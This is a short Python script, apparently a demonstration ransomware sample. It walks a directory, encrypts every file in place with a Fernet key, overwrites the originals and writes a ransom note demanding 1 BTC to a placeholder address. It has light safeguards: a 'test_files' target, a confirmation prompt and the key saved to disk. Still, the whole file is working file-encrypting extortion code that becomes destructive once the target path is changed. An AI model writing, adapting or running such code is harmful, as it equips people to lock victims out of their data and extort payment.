import os
from cryptography.fernet import Fernet

# SAFETY CONFIG (MODIFY THESE)
TARGET_DIR = "./test_files"  # Only encrypt files in this directory
KEY_FILE = "secret.key"      # File to save the decryption key
RANSOM_NOTE = "RANSOM_NOTE.txt"

# WARNING MESSAGE
print("[!] WARNING: This will ENCRYPT all files in", TARGET_DIR)
input("Press Enter to continue (Ctrl+C to abort)...")

# Generate encryption key
key = Fernet.generate_key()
with open(KEY_FILE, "wb") as key_file:
    key_file.write(key)

cipher = Fernet(key)

# Encrypt files
for root, dirs, files in os.walk(TARGET_DIR):
    for file in files:
        file_path = os.path.join(root, file)
        
        # Skip the key file and ransom note
        if file in [KEY_FILE, RANSOM_NOTE]:
            continue
        
        # Read file data
        with open(file_path, "rb") as f:
            data = f.read()
        
        # Encrypt and overwrite
        encrypted_data = cipher.encrypt(data)
        with open(file_path, "wb") as f:
            f.write(encrypted_data)

# Create ransom note
with open(os.path.join(TARGET_DIR, RANSOM_NOTE), "w") as f:
    f.write("!!! YOUR FILES HAVE BEEN ENCRYPTED !!!\n")
    f.write(f"Send 1 BTC to FAKE_ADDRESS and include '{KEY_FILE}' to decrypt.\n")

print("[+] Encryption complete. KEEP THE KEY FILE SAFE:", KEY_FILE)
